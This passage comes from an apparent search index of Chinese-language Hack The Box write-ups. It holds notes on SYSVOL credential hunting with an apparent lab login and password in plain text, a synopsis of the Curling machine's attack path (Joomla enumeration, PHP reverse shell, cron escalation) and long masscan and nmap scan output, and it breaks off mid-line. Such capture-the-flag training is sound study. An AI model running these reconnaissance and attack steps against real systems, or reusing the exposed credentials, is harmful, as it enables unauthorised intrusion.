\u4e2d\u6240\u6709\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u90fd\u5177\u6709\u8bfb\u53d6\u6743\u9650\u7684\u57df\u8303\u56f4\u5171\u4eab\u3002\u5305\u542b\u767b\u9646\u811a\u672c\uff0c\u7ec4\u7b56\u7565\u6570\u636e \u5229\u7528\u7ec4\u7b56\u7565\u9996\u9009\u9879</p> <p>\u57df\u7ec4\u7b56\u7565\u5b58\u50a8\u4f4d\u7f6e: <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code></p>"},{"location":"HTB/HTB-Active/#_2","title":"\u8bb0\u5f55","text":""},{"location":"HTB/HTB-Active/#sysvolzhong-dde-ping-zheng","title":"sysvolzhong dde ping zheng","text":"<p>\u6316\u6398 SYSVOL \u83b7\u53d6\u51ed\u8bc1</p> <p>10.129.227.164</p> <p>htb-ovuln@htb-sda3amjbjo.htb-cloud.com W6AYrtug</p> <pre><code>Service Principal Names|\u670d\u52a1\u4e3b\u4f53\u540d\u79f0\nservice instance\uff5c\u670d\u52a1\u5b9e\u4f8b\n</code></pre>"},{"location":"HTB/HTB-Curling/","title":"Hack The Box - Curling","text":""},{"location":"HTB/HTB-Curling/#synopsis","title":"SYNOPSIS","text":"<p>Curling \u662f\u4e00\u4e2a\u7b80\u5355\u96be\u5ea6\u7684 Linux \u673a\u5668\uff0c\u9700\u8981\u5927\u91cf\u679a\u4e3e\u3002\u5bc6\u7801\u4fdd\u5b58\u5728 Web \u6839\u76ee\u5f55\u7684\u6587\u4ef6\u4e2d\u3002\u7528\u6237\u540d\u53ef\u4ee5\u901a\u8fc7\u5141\u8bb8\u767b\u5f55\u7684 CMS \u4e0a\u7684\u5e16\u5b50\u679a\u4e3e\u3002\u4fee\u6539php\u6a21\u677f\u53cd\u5f39 shell\u3002\u627e\u5230\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u8f6c\u50a8\u5e76\u89e3\u538b\u5b83\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u7528\u6237\u5bc6\u7801\u3002\u5728\u679a\u4e3e\u6b63\u5728\u8fd0\u884c\u7684\u8fdb\u7a0b\u65f6\uff0c\u4f1a\u53d1\u73b0\u4e00\u4e2a\u53ef\u7528\u4e8eroot \u7684 cron\u3002</p>"},{"location":"HTB/HTB-Curling/#skills-ruquired","title":"Skills Ruquired","text":"<p>Enumeration</p>"},{"location":"HTB/HTB-Curling/#skills-learned","title":"Skills Learned","text":"<p>Analyzing hex dump Curl usage</p>"},{"location":"HTB/HTB-Curling/#enumeration","title":"Enumeration","text":""},{"location":"HTB/HTB-Curling/#port-scan","title":"Port Scan","text":"<pre><code>$ masscan -p1-65535 --rate=1000 -e tun0 $target\nDiscovered open port 22/tcp on 10.129.105.207                                  \nDiscovered open port 80/tcp on 10.129.105.207 \n\n$ nmap -sC -sV -p22,80 -v $target\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)\n|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)\n|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: Joomla! - Open Source Content Management\n|_http-title: Home\n|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"HTB/HTB-Curling/#nmap-script","title":"Nmap script","text":"<pre><code>$ nmap -p 80 --script safe $target -v $target\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 12:21 BST\nNSE: Loaded 346 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 12:21\nNSE: [mtrace] not running for lack of privileges.\nNSE: [broadcast-pppoe-discover] not running for lack of privileges.\nNSE: [broadcast-ataoe-discover] No interface supplied, use -e\nNSE: [url-snarf] not running for lack of privileges.\nNSE: [broadcast-eigrp-discovery] not running for lack of privileges.\nNSE: [broadcast-igmp-discovery] not running due to lack of privileges.\nNSE: [broadcast-pim-discovery] not running for lack of privileges.\nNSE: [shodan-api] Error: Please specify your ShodanAPI key with the shodan-api.apikey argument\nNSE: [mrinfo] not running for lack of privileges.\nNSE: [llmnr-resolve] not running due to lack of privileges.\nNSE: [knx-gateway-discover] Not running due to lack of privileges.\nNSE: not running for lack of privileges.\nNSE: [broadcast-dhcp6-discover] not running for lack of privileges.\nNSE: [lltd-discovery] not running for lack of privileges.\nNSE: [broadcast-sonicwall-discover] Not running for lack of privileges.\nNSE: [broadcast-dhcp-discover] not running for lack of privileges.\nNSE: [targets-xml] Need to supply a file name with the targets-xml.iX argument\nNSE: [broadcast-ping] not running for lack of privileges.\nNSE: [broadcast-listener] not running for lack of privileges.\nCompleted NSE at 12:22, 40.02s elapsed\nInitiating NSE at 12:22\nCompleted NSE at 12:22, 0.00s elapsed\nPre-scan script results:\n|_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.com/wpad.dat) from server\n| targets-asn: \n|_  targets-asn.asn is a mandatory parameter\n|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/\n|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/\nInitiating Ping Scan at 12:22\nScanning 2 hosts [2 ports/host]\nCompleted Ping Scan at 12:22, 0.02s elapsed (2 total hosts)\nInitiating Parallel DNS resolution of 2 hosts. at 12:22\nCompleted Parallel DNS resolution of 2 hosts. at 12:22, 0.01s elapsed\nInitiating Connect Scan at 12:22\nScanning 2 hosts [1 port/host]\nDiscovered open port 80/tcp on 10.129.105.207\nDiscovered open port 80/tcp on 10.129.105.207\nCompleted Connect Scan at 12:22, 0.00s elapsed (2 total ports)\nNSE: Script scanning 2 hosts.\nInitiating NSE at 12:22\nNSE: [path-mtu] not running for lack of privileges.\nNSE: [ipidseq] not running for lack of privileges.\nNSE: [firewalk] not running for lack of privileges.\nNSE: [qscan] not running for lack of privileges.\nNSE: [tls-ticketbleed] Not running due to lack of privileges.\nCompleted NSE at 12:22, 22.59s elapsed\nInitiating NSE at 12:22\nCompleted NSE at 12:22, 0.00s elapsed\nNmap scan report for 10.129.105.207\nHost is up (0.015s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-backup-finder: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.105.207\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1\n|_  http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~\n|_http-fetch: Please enter the complete path of the directory to save data in.\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA\n|_http-xssed: No previously reported XSS vuln.\n| http-internal-ip-disclosure: \n|_  Internal IP Leaked: 250\n| http-traceroute: \n|_  Possible reverse proxy detected.\n|_http-referer-checker: Couldn't find any cross-domain scripts.\n| http-grep: \n|   (1) http://10.129.105.207:80/: \n|     (1) ip: \n|_      + 10.129.105.207\n| http-headers: \n|   Date: Mon, 10 Oct 2022 11:22:19 GMT\n|   Server: Apache/2.4.29 (Ubuntu)\n|   Set-Cookie: c0548020854924e0aecd05ed9f5b672b=hc0lipau9p6ra5ne1u0i75f8r8; path=/; HttpOnly\n|   Expires: Wed, 17 Aug 2005 00:00:00 GMT\n|   Last-Modified: Mon, 10 Oct 2022 11:22:19 GMT\n|   Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n|   Pragma: no-cache\n|   Connection: close\n|   Content-Type: text/html; charset=utf-8\n|   \n|_  (Request type: HEAD)\n|_http-mobileversion-checker: No mobile version detected.\n| http-auth-finder: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.105.207\n|   url                                                                                method\n|   http://10.129.105.207:80/                                                          FORM\n|   http://10.129.105.207:80/index.php/component/users/?view=reset&amp;amp;Itemid=101      FORM\n|   http://10.129.105.207:80/index.php/2-uncategorised/1-first-post-of-curling2018     FORM\n|   http://10.129.105.207:80/index.php                                                 FORM\n|   http://10.129.105.207:80/index.php/2-uncategorised/2-curling-you-know-its-true     FORM\n|   http://10.129.105.207:80/index.php/component/users/?view=remind&amp;amp;Itemid=101     FORM\n|_  http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling  FORM\n|_http-title: Home\n| http-comments-displayer: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.105.207\n|     \n|     Path: http://10.129.105.207:80/media/jui/js/bootstrap.min.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /*!\n|          * Bootstrap.js by @fat &amp; @mdo\n|          * Copyright 2012 Twitter, Inc.\n|          * http://www.apache.org/licenses/LICENSE-2.0.txt\n|          *\n|          * Custom version for Joomla!\n|          */\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 213\n|     Comment: \n|         &lt;!-- End Right Sidebar --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 161\n|     Comment: \n|         &lt;!-- Begin Right Sidebar --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 42\n|     Comment: \n|         &lt;!-- Header --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 39\n|     Comment: \n|         &lt;!-- Body --&gt;\n|     \n|     Path: http://10.129.105.207:80/templates/protostar/js/template.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /**\n|          * @package     Joomla.Site\n|          * @subpackage  Templates.protostar\n|          * @copyright   Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.\n|          * @license     GNU General Public License version 2 or later; see LICENSE.txt\n|          * @since       3.2\n|          */\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 27\n|     Comment: \n|         &lt;!--[if lt IE 9]&gt;&lt;script src=\"/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n|     \n|     Path: http://10.129.105.207:80/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /**\n|         * @preserve HTML5 Shiv 3.7.3 | @afarkas @jdalton @jon_neal @rem | MIT/GPL2 Licensed\n|         */\n|     \n|     Path: http://10.129.105.207:80/index.php?format=feed&amp;amp;type=rss\n|     Line number: 2\n|     Comment: \n|         &lt;!-- generator=\"Joomla! - Open Source Content Management\" --&gt;\n|     \n|     Path: http://10.129.105.207:80/media/system/js/caption.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /*\n|                 GNU General Public License version 2 or later; see LICENSE.txt\n|         */\n|     \n|     Path: http://10.129.105.207:80/index.php/component/users/?view=remind&amp;amp;Itemid=101\n|     Line number: 29\n|     Comment: \n|         &lt;!--[if lt IE 9]&gt;&lt;script src=\"/media/system/js/html5fallback.js?b6bf078482bc6a711b54fa9e74e19603\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 233\n|     Comment: \n|         &lt;!-- secret.txt --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 218\n|     Comment: \n|         &lt;!-- Footer --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 55\n|     Comment: \n|         &lt;!-- Begin Content --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 158\n|     Comment: \n|         &lt;!-- End Content --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 29\n|     Comment: \n|_        &lt;!--[if lt IE 9]&gt;&lt;script src=\"/media/system/js/polyfill.event.js?b6bf078482bc6a711b54fa9e74e19603\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n| http-security-headers: \n|   Cache_Control: \n|     Header: Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n|   Pragma: \n|     Header: Pragma: no-cache\n|   Expires: \n|_    Header: Expires: Wed, 17 Aug 2005 00:00:00 GMT\n|_http-date: Mon, 10 Oct 2022 11:22:18 GMT; +1h00m01s from local time.\n|_http-malware-host: Host appears to be clean\n| http-useragent-tester: \n|   Status for browser useragent: 200\n|   Allowed User Agents: \n|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\n|     libwww\n|     lwp-trivial\n|     libcurl-agent/1.0\n|     PHP/\n|     Python-urllib/2.5\n|     GT::WWW\n|     Snoopy\n|     MFC_Tear_Sample\n|     HTTP::Lite\n|     PHPCrawl\n|     URI::Fetch\n|     Zend_Http_Client\n|     http client\n|     PECL::HTTP\n|     Wget/1.13.4 (linux-gnu)\n|_    WWW-Mechanize/1.34\n|_http-generator: Joomla! - Open Source Content Management\n\nHost script results:\n| unusual-port: \n|_  WARNING: this script depends on Nmap's service/version detection (-sV)\n| port-states: \n|   tcp: \n|_    open: 80\n| dns-blacklist: \n|   SPAM\n|     list.quorum.to - FAIL\n|_    l2.apews.org - FAIL\n|_clock-skew: 1h00m00s\n|_fcrdns: FAIL (No PTR record)\n\nNmap scan report for 10.129.105.207\nHost is up (0.012s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-backup-finder: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.105.207\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/1-first-post-of-curling2018\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/1-first-post-of-curling2018.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/2-curling-you-know-its-true\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.1\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/2-curling-you-know-its-true.~1~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.bak\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling~\n|   http://10.129.105.207:80/index.php/2-uncategorised/index copy.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/Copy (2) of index.php/2-uncategorised/3-what-s-the-object-of-curling\n|   http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.1\n|_  http://10.129.105.207:80/index.php/2-uncategorised/index.php/2-uncategorised/3-what-s-the-object-of-curling.~1~\n|_http-date: Mon, 10 Oct 2022 11:22:19 GMT; +1h00m00s from local time.\n|_http-title: Home\n|_http-xssed: No previously reported XSS vuln.\n| http-security-headers: \n|   Cache_Control: \n|     Header: Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n|   Pragma: \n|     Header: Pragma: no-cache\n|   Expires: \n|_    Header: Expires: Wed, 17 Aug 2005 00:00:00 GMT\n|_http-fetch: Please enter the complete path of the directory to save data in.\n|_http-malware-host: Host appears to be clean\n| http-comments-displayer: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.105.207\n|     \n|     Path: http://10.129.105.207:80/media/jui/js/bootstrap.min.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /*!\n|          * Bootstrap.js by @fat &amp; @mdo\n|          * Copyright 2012 Twitter, Inc.\n|          * http://www.apache.org/licenses/LICENSE-2.0.txt\n|          *\n|          * Custom version for Joomla!\n|          */\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 213\n|     Comment: \n|         &lt;!-- End Right Sidebar --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 161\n|     Comment: \n|         &lt;!-- Begin Right Sidebar --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 42\n|     Comment: \n|         &lt;!-- Header --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 39\n|     Comment: \n|         &lt;!-- Body --&gt;\n|     \n|     Path: http://10.129.105.207:80/templates/protostar/js/template.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /**\n|          * @package     Joomla.Site\n|          * @subpackage  Templates.protostar\n|          * @copyright   Copyright (C) 2005 - 2018 Open Source Matters, Inc. All rights reserved.\n|          * @license     GNU General Public License version 2 or later; see LICENSE.txt\n|          * @since       3.2\n|          */\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 27\n|     Comment: \n|         &lt;!--[if lt IE 9]&gt;&lt;script src=\"/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n|     \n|     Path: http://10.129.105.207:80/media/jui/js/html5.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /**\n|         * @preserve HTML5 Shiv 3.7.3 | @afarkas @jdalton @jon_neal @rem | MIT/GPL2 Licensed\n|         */\n|     \n|     Path: http://10.129.105.207:80/index.php?format=feed&amp;amp;type=rss\n|     Line number: 2\n|     Comment: \n|         &lt;!-- generator=\"Joomla! - Open Source Content Management\" --&gt;\n|     \n|     Path: http://10.129.105.207:80/media/system/js/caption.js?b6bf078482bc6a711b54fa9e74e19603\n|     Line number: 1\n|     Comment: \n|         /*\n|                 GNU General Public License version 2 or later; see LICENSE.txt\n|         */\n|     \n|     Path: http://10.129.105.207:80/index.php/component/users/?view=remind&amp;amp;Itemid=101\n|     Line number: 29\n|     Comment: \n|         &lt;!--[if lt IE 9]&gt;&lt;script src=\"/media/system/js/html5fallback.js?b6bf078482bc6a711b54fa9e74e19603\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 233\n|     Comment: \n|         &lt;!-- secret.txt --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 218\n|     Comment: \n|         &lt;!-- Footer --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 55\n|     Comment: \n|         &lt;!-- Begin Content --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 158\n|     Comment: \n|         &lt;!-- End Content --&gt;\n|     \n|     Path: http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling\n|     Line number: 29\n|     Comment: \n|_        &lt;!--[if lt IE 9]&gt;&lt;script src=\"/media/system/js/polyfill.event.js?b6bf078482bc6a711b54fa9e74e19603\"&gt;&lt;/script&gt;&lt;![endif]--&gt;\n|_http-mobileversion-checker: No mobile version detected.\n| http-useragent-tester: \n|   Status for browser useragent: 200\n|   Allowed User Agents: \n|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\n|     libwww\n|     lwp-trivial\n|     libcurl-agent/1.0\n|     PHP/\n|     Python-urllib/2.5\n|     GT::WWW\n|     Snoopy\n|     MFC_Tear_Sample\n|     HTTP::Lite\n|     PHPCrawl\n|     URI::Fetch\n|     Zend_Http_Client\n|     http client\n|     PECL::HTTP\n|     Wget/1.13.4 (linux-gnu)\n|_    WWW-Mechanize/1.34\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-traceroute: \n|_  Possible reverse proxy detected.\n|_http-referer-checker: Couldn't find any cross-domain scripts.\n|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA\n| http-headers: \n|   Date: Mon, 10 Oct 2022 11:22:21 GMT\n|   Server: Apache/2.4.29 (Ubuntu)\n|   Set-Cookie: c0548020854924e0aecd05ed9f5b672b=i83sbh62st9mlm2095fgb0rmgq; path=/; HttpOnly\n|   Expires: Wed, 17 Aug 2005 00:00:00 GMT\n|   Last-Modified: Mon, 10 Oct 2022 11:22:21 GMT\n|   Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\n|   Pragma: no-cache\n|   Connection: close\n|   Content-Type: text/html; charset=utf-8\n|   \n|_  (Request type: HEAD)\n| http-auth-finder: \n| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.105.207\n|   url                                                                                method\n|   http://10.129.105.207:80/                                                          FORM\n|   http://10.129.105.207:80/index.php/component/users/?view=reset&amp;amp;Itemid=101      FORM\n|   http://10.129.105.207:80/index.php/2-uncategorised/1-first-post-of-curling2018     FORM\n|   http://10.129.105.207:80/index.php                                                 FORM\n|   http://10.129.105.207:80/index.php/2-uncategorised/2-curling-you-know-its-true     FORM\n|   http://10.129.105.207:80/index.php/component/users/?view=remind&amp;amp;Itemid=101     FORM\n|_  http://10.129.105.207:80/index.php/2-uncategorised/3-what-s-the-object-of-curling  FORM\n| http-grep: \n|   (1) http://10.129.105.207:80/: \n|     (1) ip: \n|_      + 10.129.105.207\n|_http-generator: Joomla! - Open Source Content Management\n| http-internal-ip-disclosure: \n|_  Internal IP Leaked: 